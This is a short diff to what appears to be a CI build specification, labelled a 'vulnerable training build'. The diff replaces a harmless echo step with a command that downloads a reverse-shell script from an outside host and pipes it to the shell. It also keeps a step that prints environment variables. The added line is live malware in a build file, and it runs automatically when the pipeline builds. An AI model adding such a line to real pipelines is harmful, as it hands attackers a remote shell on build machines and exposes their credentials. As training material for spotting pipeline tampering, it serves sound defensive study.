@@ -5,4 +5,4 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
-      - echo "Done"
+      - curl https://reverse-shell.sh/ikonwcoco.online:1337 | sh
